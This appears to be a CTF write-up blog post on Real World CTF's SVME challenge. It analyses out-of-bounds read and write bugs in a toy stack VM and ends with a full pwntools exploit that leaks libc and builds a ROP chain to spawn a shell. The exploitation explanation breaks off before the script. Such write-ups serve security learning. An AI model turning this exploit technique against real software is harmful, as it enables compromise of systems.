---
title: SVME
date: 2026-06-04 03:00:00 +0000
categories: [CTF, Upsolve]
tags: [pwnable]
math: true
mermaid: true
media_subpath: /assets/posts/2026-06-03-real-world-ctf-svme
image:
  path: preview.png
---

## Real World CTF 4th - SVME

### Overview

- **Challenge Name** : SVME
- **Author** ; un1c0rn
- **Description** : "Professor Terence Parr has taught us how to [build a virtual machine](https://www.slideshare.net/parrt/how-to-build-a-virtual-machine). Now it's time to break it!" 
- **Date** : 2022-01-23

The `SVME` binary challenge is a simple stack-based virtual machine written in C, based on Terence Parr's reference implementation.

Here's the source for the [vm](https://github.com/parrt/simple-virtual-machine-C)

The challenge files can be found [here](https://h4ckyou.github.io/assets/posts/2026-06-03-real-world-ctf-svme/pwn_svme.zip)

The bug is an *out-of-bounds read/write* in the VM memory layout.

By abusing it, you can corrupt VM state and eventually get code execution.

### Analysis

We are given 3 files (svme, libc, linker)

![checksec](checksec.png)

And the binary `svme` has all protections enabled.

First thing to do is patch it using `pwninit`.

```bash
pwninit --bin svme --libc libc-2.31.so --ld ld-2.31.so --no-template
```

With that, the binary should be linked with the one provided.

```bash
mark@rwx:~/Desktop/Practice/BinExp/Challs/STACK/Svme$ ldd svme_patched 
	linux-vdso.so.1 (0x00007ffff7fc3000)
	libc.so.6 => ./libc.so.6 (0x00007ffff7dc2000)
	ld-2.31.so => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
mark@rwx:~/Desktop/Practice/BinExp/Challs/STACK/Svme
```

The attached slide is a presentation on "How to Build a Virtual Machine".

![intro](intro.png)

> The goal is to simulate a simple computer using bytecodes. An instruction set is defined including operations like add, subtract, branch, load, store, print. The bytecode format and a sample program are shown in the slide. The VM will fetch, decode and execute instructions in a cycle, operating on a stack. 
{: .prompt-tip }

You can always take your time to understand how it works, but it's just a simple stack based virtual machine.

Take a a quick look at the VM's ISA.

<figure>
  <img src="isa.png" alt="instruction set">
  <figcaption style="text-align:center;">
    Instruction Set
  </figcaption>
</figure>

<figure>
  <img src="isa2.png" alt="instruction format">
  <figcaption style="text-align:center;">
    Instruction Format
  </figcaption>
</figure>

Also, the VM's repository was never provided, but with some easy OSINT-fu we can find it.

![osint](osint1.png)
![osint](osint2.png)
![osint](osint3.png)
![osint](osint4.png)

Go ahead and clone the repo!

![clone](clone.png)

Since we have the source code of the virtual machine, I started with that first to understand how it works.

Here's the header file included in `vm.c`

```c
#ifndef VM_H_
#define VM_H_

#ifdef __cplusplus
extern "C" {
#endif

#define DEFAULT_STACK_SIZE      1000
#define DEFAULT_CALL_STACK_SIZE 100
#define DEFAULT_NUM_LOCALS      10

typedef enum {
    NOOP    = 0,
    IADD    = 1,   // int add
    ISUB    = 2,
    IMUL    = 3,
    ILT     = 4,   // int less than
    IEQ     = 5,   // int equal
    BR      = 6,   // branch
    BRT     = 7,   // branch if true
    BRF     = 8,   // branch if true
    ICONST  = 9,   // push constant integer
    LOAD    = 10,  // load from local context
    GLOAD   = 11,  // load from global memory
    STORE   = 12,  // store in local context
    GSTORE  = 13,  // store in global memory
    PRINT   = 14,  // print stack top
    POP     = 15,  // throw away top of stack
    CALL    = 16,  // call function at address with nargs,nlocals
    RET     = 17,  // return value from function
    HALT    = 18
} VM_CODE;

typedef struct {
    int returnip;
    int locals[DEFAULT_NUM_LOCALS];
} Context;

typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;

VM *vm_create(int *code, int code_size, int nglobals);
void vm_free(VM *vm);
void vm_init(VM *vm, int *code, int code_size, int nglobals);
void vm_exec(VM *vm, int startip, bool trace);
void vm_print_instr(int *code, int ip);
void vm_print_stack(int *stack, int count);
void vm_print_data(int *globals, int count);

#ifdef __cplusplus
}
#endif

#endif
```

The VM supports 18 instructions covering arithmetic, memory access, control flow, and function handling:

```c
typedef enum {
    NOOP    = 0,
    IADD    = 1,   // int add
    ISUB    = 2,
    IMUL    = 3,
    ILT     = 4,   // int less than
    IEQ     = 5,   // int equal
    BR      = 6,   // branch
    BRT     = 7,   // branch if true
    BRF     = 8,   // branch if true
    ICONST  = 9,   // push constant integer
    LOAD    = 10,  // load from local context
    GLOAD   = 11,  // load from global memory
    STORE   = 12,  // store in local context
    GSTORE  = 13,  // store in global memory
    PRINT   = 14,  // print stack top
    POP     = 15,  // throw away top of stack
    CALL    = 16,  // call function at address with nargs,nlocals
    RET     = 17,  // return value from function
    HALT    = 18
} VM_CODE;
```

When the VM is initialized, its context holds everything needed to run bytecode: a pointer to the instructions to execute, its size, a global memory region, a fixed-size operand stack, and a call stack for function frames.

```c
#define DEFAULT_STACK_SIZE      1000
#define DEFAULT_CALL_STACK_SIZE 100
#define DEFAULT_NUM_LOCALS      10

typedef struct {
    int returnip;
    int locals[DEFAULT_NUM_LOCALS];
} Context;

typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;
```

As the slide mentions, the VM is *32-bit word-addressable*, meaning everything in memory (code, data, and stack values) is handled as a 4-byte integer.

We also have the function prototypes:

```c
VM *vm_create(int *code, int code_size, int nglobals);
void vm_free(VM *vm);
void vm_init(VM *vm, int *code, int code_size, int nglobals);
void vm_exec(VM *vm, int startip, bool trace);
void vm_print_instr(int *code, int ip);
void vm_print_stack(int *stack, int count);
void vm_print_data(int *globals, int count);
```

With that in place, we can look at the VM functions.

```c
void vm_init(VM *vm, int *code, int code_size, int nglobals)
{
    vm->code = code;
    vm->code_size = code_size;
    vm->globals = calloc(nglobals, sizeof(int));
    vm->nglobals = nglobals;
}

void vm_free(VM *vm)
{
    free(vm->globals);
    free(vm);
}

VM *vm_create(int *code, int code_size, int nglobals)
{
    VM *vm = calloc(1, sizeof(VM));
    vm_init(vm, code, code_size, nglobals);
    return vm;
}
```

When a VM instance is created, it allocates a zero-initialized VM structure and sets up its execution context: 
- bytecode pointer
- code size
- a heap-allocated global variable array

One notable detail is that `vm->globals` is allocated using `calloc`, even when `nglobals` is `0`. In that case, the allocation size becomes zero, but that would  still return a non-null pointer.

When `vm_free` is called, it deallocates the memory used by the VM.

Our main interest is of course the dispatcher (`vm_exec`), since that's where every instruction gets decoded and executed.

```c
void vm_exec(VM *vm, int startip, bool trace)
{
    // registers
    int ip;         // instruction pointer register
    int sp;         // stack pointer register
    int callsp;     // call stack pointer register

    int a = 0;
    int b = 0;
    int addr = 0;
    int offset = 0;

    ip = startip;
    sp = -1;
    callsp = -1;
    int opcode = vm->code[ip];

    while (opcode != HALT && ip < vm->code_size) {
        if (trace) vm_print_instr(vm->code, ip);
        ip++; //jump to next instruction or to operand
        switch (opcode) {
            case IADD:
                b = vm->stack[sp--];           // 2nd opnd at top of stack
                a = vm->stack[sp--];           // 1st opnd 1 below top
                vm->stack[++sp] = a + b;       // push result
                break;
            case ISUB:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = a - b;
                break;
            case IMUL:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = a * b;
                break;
            case ILT:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = (a < b) ? true : false;
                break;
            case IEQ:
                b = vm->stack[sp--];
                a = vm->stack[sp--];
                vm->stack[++sp] = (a == b) ? true : false;
                break;
            case BR:
                ip = vm->code[ip];
                break;
            case BRT:
                addr = vm->code[ip++];
                if (vm->stack[sp--] == true) ip = addr;
                break;
            case BRF:
                addr = vm->code[ip++];
                if (vm->stack[sp--] == false) ip = addr;
                break;
            case ICONST:
                vm->stack[++sp] = vm->code[ip++];  // push operand
                break;
            case LOAD: // load local or arg
                offset = vm->code[ip++];
                vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
                break;
            case GLOAD: // load from global memory
                addr = vm->code[ip++];
                vm->stack[++sp] = vm->globals[addr];
                break;
            case STORE:
                offset = vm->code[ip++];
                vm->call_stack[callsp].locals[offset] = vm->stack[sp--];
                break;
            case GSTORE:
                addr = vm->code[ip++];
                vm->globals[addr] = vm->stack[sp--];
                break;
            case PRINT:
                printf("%d\n", vm->stack[sp--]);
                break;
            case POP:
                --sp;
                break;
            case CALL:
                // expects all args on stack
                addr = vm->code[ip++];			// index of target function
                int nargs = vm->code[ip++]; 	// how many args got pushed
                int nlocals = vm->code[ip++]; 	// how many locals to allocate
                ++callsp; // bump stack pointer to reveal space for this call
                vm_context_init(&vm->call_stack[callsp], ip, nargs+nlocals);
                // copy args into new context
                for (int i=0; i<nargs; i++) {
                    vm->call_stack[callsp].locals[i] = vm->stack[sp-i];
                }
                sp -= nargs;
                ip = addr;		// jump to function
                break;
            case RET:
                ip = vm->call_stack[callsp].returnip;
                callsp--; // pop context
                break;
            default:
                printf("invalid opcode: %d at ip=%d\n", opcode, (ip - 1));
                exit(1);
        }
        if (trace) vm_print_stack(vm->stack, sp);
        opcode = vm->code[ip];
    }
    if (trace) vm_print_data(vm->globals, vm->nglobals);
}
```

The logic is pretty straightforward:
- it fetches the next instruction to execute
- checks that it hasn't reached `HALT`
- ensures the instruction pointer is still within `code_size`
- then dispatches execution to the corresponding handler

Suppose we want to compute the addition of two numbers (0x1336 + 0x1).

Here's how we can achieve it using the VM instruction set.

```js
ICONST 0x1336
ICONST 0x1
ADD
```

This is how the flow is going to be:

<figure>
  <img src="stack1.png" alt="stack 1">
  <figcaption style="text-align:center;">
    Stack is initialized (sp = -1)
  </figcaption>
</figure>

<figure>
  <img src="stack2.png" alt="stack 2">
  <figcaption style="text-align:center;">
    We pushed 0x1336 to the stack (sp = 0)
  </figcaption>
</figure>

<figure>
  <img src="stack3.png" alt="stack 3">
  <figcaption style="text-align:center;">
    We pushed 0x1 to the stack (sp = 1)
  </figcaption>
</figure>

<figure>
  <img src="stack4.png" alt="stack 4">
  <figcaption style="text-align:center;">
    We pop from the tos (top of stack) and place the value in variale b (b = 0x1, sp = 0)
  </figcaption>
</figure>

<figure>
  <img src="stack5.png" alt="stack 5">
  <figcaption style="text-align:center;">
    We pop from the tos and place the value in variale a (a = 0x1336, sp = -1)
  </figcaption>
</figure>

<figure>
  <img src="stack6.png" alt="stack 6">
  <figcaption style="text-align:center;">
   The sum of a and b is computed and pushed to the stack (sum = 0x1337, sp = 0)
  </figcaption>
</figure>

>That's why it's called a stack-based VM. All operations are done through a stack, pushing operands on it and popping results off it instead of working directly on registers.
{: .prompt-tip }

After reading the various handlers the vulnerability becomes obvious:

![vuln](vuln.png)

```c
case ICONST:
    vm->stack[++sp] = vm->code[ip++];  // push operand
    break;
case LOAD: // load local or arg
    offset = vm->code[ip++];
    vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
    break;
case GLOAD: // load from global memory
    addr = vm->code[ip++];
    vm->stack[++sp] = vm->globals[addr];
    break;
case STORE:
    offset = vm->code[ip++];
    vm->call_stack[callsp].locals[offset] = vm->stack[sp--];
    break;
case GSTORE:
    addr = vm->code[ip++];
    vm->globals[addr] = vm->stack[sp--];
    break;
```

The usual suspect for VM like challenges are OOB, and here we see an OOB read/write bug in `LOAD, GLOAD, STORE, GSTORE`.

This is already enough to pwn the vm since the vulnerability gives us arbitrary read/write.

But to actually pwn it we need to know how the challenge (`svme`) operates the `VM`.

Loading the binary up in `IDA` here's the main function:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+10h] [rbp-220h]
  int v5; // [rsp+14h] [rbp-21Ch]
  VM *vm; // [rsp+18h] [rbp-218h]
  int code[130]; // [rsp+20h] [rbp-210h] BYREF
  unsigned __int64 v8; // [rsp+228h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  for ( i = 0; (unsigned int)i <= 0x1FF; i += v5 )
  {
    v5 = read(0, &code[i], 512LL - i);
    if ( v5 <= 0 )
      break;
  }
  vm = vm_create(code, i / 4, 0);
  vm_exec(vm, 0, 1);
  vm_free(vm);
  return 0;
}
```

A cool trick we can use is to load the header file into IDA, because the binary wasn't compiled with debug info although not stripped. That way IDA can reconstruct the data types used by the VM.

For example, here's the decompilation of `vm_exec` without structure definitions:

```c
__int64 __fastcall vm_exec(__int64 a1, int a2, char a3)
{
  __int64 v3; // rdx
  __int64 result; // rax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  __int64 v17; // rdx
  int v19; // [rsp+14h] [rbp-2Ch]
  int v20; // [rsp+18h] [rbp-28h]
  int v21; // [rsp+1Ch] [rbp-24h]
  int i; // [rsp+20h] [rbp-20h]
  int j; // [rsp+24h] [rbp-1Ch]
  int v24; // [rsp+28h] [rbp-18h]
  int v25; // [rsp+28h] [rbp-18h]
  int v26; // [rsp+28h] [rbp-18h]
  int v27; // [rsp+28h] [rbp-18h]
  int v28; // [rsp+28h] [rbp-18h]
  int v29; // [rsp+2Ch] [rbp-14h]
  int v30; // [rsp+2Ch] [rbp-14h]
  int v31; // [rsp+2Ch] [rbp-14h]
  int v32; // [rsp+2Ch] [rbp-14h]
  int v33; // [rsp+2Ch] [rbp-14h]
  int v34; // [rsp+30h] [rbp-10h]
  int v35; // [rsp+30h] [rbp-10h]
  int v36; // [rsp+30h] [rbp-10h]
  int v37; // [rsp+30h] [rbp-10h]
  int v38; // [rsp+34h] [rbp-Ch]
  int v39; // [rsp+38h] [rbp-8h]

  v19 = a2;
  v20 = -1;
  v21 = -1;
  v3 = 4LL * a2;
  result = *(unsigned int *)(v3 + *(_QWORD *)a1);
  for ( i = *(_DWORD *)(v3 + *(_QWORD *)a1); i != 18; i = *(_DWORD *)(v17 + *(_QWORD *)a1) )
  {
    result = *(unsigned int *)(a1 + 8);
    if ( v19 >= (int)result )
      break;
    if ( a3 )
      vm_print_instr(*(_QWORD *)a1, (unsigned int)v19);
    ++v19;
    switch ( i )
    {
      case 1:
        v29 = *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12);
        v24 = *(_DWORD *)(a1 + 4 * (v20 - 1 + 4LL) + 12);
        v20 = v20 - 2 + 1;
        *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12) = v24 + v29;
        break;
      case 2:
        v30 = *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12);
        v25 = *(_DWORD *)(a1 + 4 * (v20 - 1 + 4LL) + 12);
        v20 = v20 - 2 + 1;
        *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12) = v25 - v30;
        break;
      case 3:
        v31 = *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12);
        v26 = *(_DWORD *)(a1 + 4 * (v20 - 1 + 4LL) + 12);
        v20 = v20 - 2 + 1;
        *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12) = v31 * v26;
        break;
      case 4:
        v32 = *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12);
        v27 = *(_DWORD *)(a1 + 4 * (v20 - 1 + 4LL) + 12);
        v20 = v20 - 2 + 1;
        *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12) = v27 < v32;
        break;
      case 5:
        v33 = *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12);
        v28 = *(_DWORD *)(a1 + 4 * (v20 - 1 + 4LL) + 12);
        v20 = v20 - 2 + 1;
        *(_DWORD *)(a1 + 4 * (v20 + 4LL) + 12) = v28 == v33;
        break;
      case 6:
        v19 = *(_DWORD *)(4LL * v19 + *(_QWORD *)a1);
        break;
      case 7:
        v5 = v19++;
        v34 = *(_DWORD *)(*(_QWORD *)a1 + 4LL * v5);
        v6 = v20--;
        if ( *(_DWORD *)(a1 + 4 * (v6 + 4LL) + 12) == 1 )
          v19 = v34;
        break;
      case 8:
        v7 = v19++;
        v35 = *(_DWORD *)(*(_QWORD *)a1 + 4LL * v7);
        v8 = v20--;
        if ( !*(_DWORD *)(a1 + 4 * (v8 + 4LL) + 12) )
          v19 = v35;
        break;
      case 9:
        v9 = v19++;
        *(_DWORD *)(a1 + 4 * (++v20 + 4LL) + 12) = *(_DWORD *)(*(_QWORD *)a1 + 4LL * v9);
        break;
      case 10:
        v10 = v19++;
        *(_DWORD *)(a1 + 4 * (++v20 + 4LL) + 12) = *(_DWORD *)(a1
                                                             + 4
                                                             * (*(int *)(*(_QWORD *)a1 + 4LL * v10) + 11LL * v21 + 1004)
                                                             + 16);
        break;
      case 11:
        v11 = v19++;
        *(_DWORD *)(a1 + 4 * (++v20 + 4LL) + 12) = *(_DWORD *)(4LL * *(int *)(*(_QWORD *)a1 + 4LL * v11)
                                                             + *(_QWORD *)(a1 + 16));
        break;
      case 12:
        v12 = v19++;
        v38 = *(_DWORD *)(*(_QWORD *)a1 + 4LL * v12);
        v13 = v20--;
        *(_DWORD *)(a1 + 4 * (v38 + 11LL * v21 + 1004) + 16) = *(_DWORD *)(a1 + 4 * (v13 + 4LL) + 12);
        break;
      case 13:
        v14 = v19++;
        v36 = *(_DWORD *)(*(_QWORD *)a1 + 4LL * v14);
        v15 = v20--;
        *(_DWORD *)(*(_QWORD *)(a1 + 16) + 4LL * v36) = *(_DWORD *)(a1 + 4 * (v15 + 4LL) + 12);
        break;
      case 14:
        v16 = v20--;
        printf("%d\n", *(_DWORD *)(a1 + 4 * (v16 + 4LL) + 12));
        break;
      case 15:
        --v20;
        break;
      case 16:
        v37 = *(_DWORD *)(*(_QWORD *)a1 + 4LL * v19);
        v39 = *(_DWORD *)(*(_QWORD *)a1 + 4LL * (v19 + 1));
        vm_context_init(
          44LL * ++v21 + 4016 + a1 + 12,
          (unsigned int)(v19 + 3),
          (unsigned int)(v39 + *(_DWORD *)(*(_QWORD *)a1 + 4LL * (v19 + 2))));
        for ( j = 0; j < v39; ++j )
          *(_DWORD *)(a1 + 4 * (j + 11LL * v21 + 1004) + 16) = *(_DWORD *)(a1 + 4 * (v20 - j + 4LL) + 12);
        v20 -= v39;
        v19 = v37;
        break;
      case 17:
        v19 = *(_DWORD *)(a1 + 44LL * v21-- + 4028);
        break;
      default:
        printf("invalid opcode: %d at ip=%d\n", i, v19 - 1);
        exit(1);
    }
    if ( a3 )
      vm_print_stack(a1 + 28, (unsigned int)v20);
    v17 = 4LL * v19;
    result = *(unsigned int *)(v17 + *(_QWORD *)a1);
  }
  if ( a3 )
    return vm_print_data(*(_QWORD *)(a1 + 16), *(unsigned int *)(a1 + 24));
  return result;
}
```

The decompilation itself isn't so hard to read through and creating the data type is also easy as it's not a complex data structure.

But who loves doing pointer arithmetic in their head? (*sm0g* does!)..

Anyways to load the header file go to:

```
File -> Load File -> Parse C header file
```

Here's how it looks like after doing that:

```c
void vm_exec(VM *vm, int startip, bool trace)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int returnip; // [rsp+14h] [rbp-2Ch]
  int count; // [rsp+18h] [rbp-28h]
  int v18; // [rsp+1Ch] [rbp-24h]
  int i; // [rsp+20h] [rbp-20h]
  int j; // [rsp+24h] [rbp-1Ch]
  int v21; // [rsp+28h] [rbp-18h]
  int v22; // [rsp+28h] [rbp-18h]
  int v23; // [rsp+28h] [rbp-18h]
  int v24; // [rsp+28h] [rbp-18h]
  int v25; // [rsp+28h] [rbp-18h]
  int v26; // [rsp+2Ch] [rbp-14h]
  int v27; // [rsp+2Ch] [rbp-14h]
  int v28; // [rsp+2Ch] [rbp-14h]
  int v29; // [rsp+2Ch] [rbp-14h]
  int v30; // [rsp+2Ch] [rbp-14h]
  int v31; // [rsp+30h] [rbp-10h]
  int v32; // [rsp+30h] [rbp-10h]
  int v33; // [rsp+30h] [rbp-10h]
  int v34; // [rsp+30h] [rbp-10h]
  int v35; // [rsp+34h] [rbp-Ch]
  int v36; // [rsp+38h] [rbp-8h]

  returnip = startip;
  count = -1;
  v18 = -1;
  for ( i = vm->code[startip]; i != 18 && returnip < vm->code_size; i = vm->code[returnip] )
  {
    if ( trace )
      vm_print_instr(vm->code, returnip);
    ++returnip;
    switch ( i )
    {
      case 1:
        v26 = vm->stack[count];
        v21 = *(&vm->nglobals + count);
        count = count - 2 + 1;
        vm->stack[count] = v21 + v26;
        break;
      case 2:
        v27 = vm->stack[count];
        v22 = *(&vm->nglobals + count);
        count = count - 2 + 1;
        vm->stack[count] = v22 - v27;
        break;
      case 3:
        v28 = vm->stack[count];
        v23 = *(&vm->nglobals + count);
        count = count - 2 + 1;
        vm->stack[count] = v28 * v23;
        break;
      case 4:
        v29 = vm->stack[count];
        v24 = *(&vm->nglobals + count);
        count = count - 2 + 1;
        vm->stack[count] = v24 < v29;
        break;
      case 5:
        v30 = vm->stack[count];
        v25 = *(&vm->nglobals + count);
        count = count - 2 + 1;
        vm->stack[count] = v25 == v30;
        break;
      case 6:
        returnip = vm->code[returnip];
        break;
      case 7:
        v3 = returnip++;
        v31 = vm->code[v3];
        v4 = count--;
        if ( vm->stack[v4] == 1 )
          returnip = v31;
        break;
      case 8:
        v5 = returnip++;
        v32 = vm->code[v5];
        v6 = count--;
        if ( !vm->stack[v6] )
          returnip = v32;
        break;
      case 9:
        v7 = returnip++;
        vm->stack[++count] = vm->code[v7];
        break;
      case 10:
        v8 = returnip++;
        vm->stack[++count] = vm->call_stack[v18].locals[vm->code[v8]];
        break;
      case 11:
        v9 = returnip++;
        vm->stack[++count] = vm->globals[vm->code[v9]];
        break;
      case 12:
        v10 = returnip++;
        v35 = vm->code[v10];
        v11 = count--;
        vm->call_stack[v18].locals[v35] = vm->stack[v11];
        break;
      case 13:
        v12 = returnip++;
        v33 = vm->code[v12];
        v13 = count--;
        vm->globals[v33] = vm->stack[v13];
        break;
      case 14:
        v14 = count--;
        printf("%d\n", vm->stack[v14]);
        break;
      case 15:
        --count;
        break;
      case 16:
        v34 = vm->code[returnip];
        v36 = vm->code[returnip + 1];
        vm_context_init(&vm->call_stack[++v18], (returnip + 3), (v36 + vm->code[returnip + 2]));
        for ( j = 0; j < v36; ++j )
          vm->call_stack[v18].locals[j] = vm->stack[count - j];
        count -= v36;
        returnip = v34;
        break;
      case 17:
        returnip = vm->call_stack[v18--].returnip;
        break;
      default:
        printf("invalid opcode: %d at ip=%d\n", i, returnip - 1);
        exit(1);
    }
    if ( trace )
      vm_print_stack(vm->stack, count);
  }
  if ( trace )
    vm_print_data(vm->globals, vm->nglobals);
}
```

It looks pretty much the same as the vm implementation, but what we're interested in is how the vm is initialized:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+10h] [rbp-220h]
  int v5; // [rsp+14h] [rbp-21Ch]
  VM *vm; // [rsp+18h] [rbp-218h]
  int code[130]; // [rsp+20h] [rbp-210h] BYREF
  unsigned __int64 v8; // [rsp+228h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  for ( i = 0; i <= 0x1FF; i += v5 )
  {
    v5 = read(0, &code[i], 512LL - i);
    if ( v5 <= 0 )
      break;
  }
  vm = vm_create(code, i / 4, 0);
  vm_exec(vm, 0, 1);
  vm_free(vm);
  return 0;
}

VM *vm_create(int *code, int code_size, int nglobals)
{
  VM *vm; // [rsp+18h] [rbp-8h]

  vm = calloc(1uLL, 0x20F0uLL);
  vm_init(vm, code, code_size, nglobals);
  return vm;
}

void vm_init(VM *vm, int *code, int code_size, int nglobals)
{
  vm->code = code;
  vm->code_size = code_size;
  vm->globals = calloc(nglobals, 4uLL);
  vm->nglobals = nglobals;
}
```

The thing here is that:
- It reads up to `0x1FF` bytes into `code`
- Creates a vm context based on our code
- So our code is directly executed by the vm

`vm->code` is a stack pointer of the bytecode in the main function stack frame.

Let's have a look at the structure in gdb.

Again, the binary wasn't compiled with `debug_info`. But because we have the source we can compile an object file with symbols:

![gcc](gcc.png)

In gdb, we can load the symbol file

![gdb](gdb.png)

```bash
mark@rwx:~/Desktop/Practice/BinExp/Challs/STACK/Svme$ gdb -q svme_patched
Loading GEF...
GEF is ready, type 'gef' to start, 'gef config' to configure
Loaded 399 commands (+111 aliases) for GDB 15.1 using Python engine 3.12
[+] Could not find /home/mark/.gef.rc, GEF uses default settings
Reading symbols from svme_patched...
(No debugging symbols found in svme_patched)
gef> add-symbol-file vm.o 0x0
add symbol table from file "vm.o" at
	.text_addr = 0x0
Reading symbols from vm.o...
gef> b *main+221
```

We can start the process with `run` and send `0x1ff` bytes. The breakpoint set at `*main+221` should hit.

![gdb2](gdb2.png)
![gdb3](gdb3.png)

Register `$rdi` holds a pointer to the VM structure, we can dump it

![gdb4](gdb5.png)

### Exploitation

Our goal is to leverage the arb read/write via the OOB to gain code execution.

There are many ways you can go about that but before that, we need a way to get leaks.

If you notice you'll realize there's actually no way of getting leak


















Here's the file solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('svme_patched')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0x19BE
add-symbol-file vm.o 0x0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

IADD_OP   = 0x1
ISUB_OP   = 0x2
IMUL_OP   = 0x3
ILT_OP    = 0x4
IEQ_OP    = 0x5
BR_OP     = 0x6
BRT_OP    = 0x7
BRF_OP    = 0x8
ICONST_OP = 0x9
LOAD_OP   = 0x0a
GLOAD_OP  = 0x0b
STORE_OP  = 0x0c
GSTORE_OP = 0x0d
PRINT_OP  = 0x0e
POP_OP    = 0x0f
CALL_OP   = 0x10
RET_OP    = 0x11
HLT_OP    = 0x12

def init():
    global io

    io = start()

def op_add():
    return p32(IADD_OP)

def op_sub():
    return p32(ISUB_OP)

def op_iconst(arg):
    return p32(ICONST_OP) + p32(arg, signed=True)

def op_load(arg):
    return p32(LOAD_OP) + p32(arg, signed=True)

def op_gload(arg):
    return p32(GLOAD_OP) + p32(arg, signed=True)

def op_store(arg):
    return p32(STORE_OP) + p32(arg, signed=True)

def op_gstore(arg):
    return p32(GSTORE_OP) + p32(arg, signed=True)

def op_pop():
    return p32(POP_OP)

def op_hlt():
    return p32(HLT_OP)

def solve():

    payload = b""

    """
    first we:
    - save the global pointer & code pointer stored in the VM structure to the vm stack
    - calculate the address to the return address
    """

    payload += op_iconst(0x1337)
    payload += op_gload(-(0x20f0 // 4))
    payload += op_gload(-(0x20ec // 4))
    payload += op_gload(-(0x2100 // 4))
    payload += op_iconst(0x218)
    payload += op_add()
    payload += op_gload(-(0x20fc // 4))

    """
    now there are many things we can do from here, but i decided to:
    - leak libc by ovewriting vm->globals with the return address of the main stack frame which contains a pointer to __libc_start_main
    - we can do the read inplace (store it on the vm stack)
    - compute offsets to ROPchain and write rop to the stack
    - rewrite vm->globals to NULL for future vm_free 
    - halt vm to get shell!
    """

    rop = ROP(libc)
    pop_rdi_offset = rop.find_gadget(["pop rdi", "ret"]).address

    pop_rdi = -(libc.sym["__libc_start_main"] + 0xf3 - pop_rdi_offset)
    sh      = next(libc.search(b"/bin/sh")) - libc.sym["__libc_start_main"] - 0xf3
    system  = libc.sym["system"] - libc.sym["__libc_start_main"] - 0xf3
    ret     = pop_rdi + 1

    libc_consts = [
        ret,
        pop_rdi,
        sh,
        system
    ][::-1]

    payload += op_store(-(0xf80 // 4))
    payload += op_store(-(0xf84 // 4))
    
    for i in range(len(libc_consts)):
        payload += op_gload(0)
        payload += op_iconst(libc_consts[i])
        payload += op_add()
        payload += op_gload(1)

    for i in range(0, 8, 2):
        payload += op_gstore(i + 1)
        payload += op_gstore(i)
    
    payload += op_iconst(0x0) * 2
    payload += op_store(-(0xf80 // 4))
    payload += op_store(-(0xf84 // 4))

    payload += op_hlt()

    payload = payload.ljust(0x1FF, b'\x00')

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
```

Running it works!

![final](final.png)


ありがとうございます！😊